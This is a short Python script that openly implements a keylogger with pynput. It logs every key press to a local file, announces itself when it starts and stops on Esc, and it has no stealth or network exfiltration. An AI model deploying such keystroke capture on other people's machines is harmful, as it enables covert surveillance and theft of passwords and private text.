from pynput.keyboard import Key, Listener

# Define the path to save the log file
log_file = "keystrokes.log"

# Callback function to handle key press events
def on_press(key):
    try:
        # Open the log file in append mode
        with open(log_file, "a") as f:
            # Write the pressed key to the log file
            f.write(str(key) + "\n")
    except Exception as e:
        print("Error:", e)

# Callback function to handle key release events
def on_release(key):
    if key == Key.esc:  # Stop the listener when the 'Esc' key is pressed
        return False

# Create a listener object
with Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started. Press 'Esc' to stop.")
    listener.join()  # Wait for the listener thread to stop
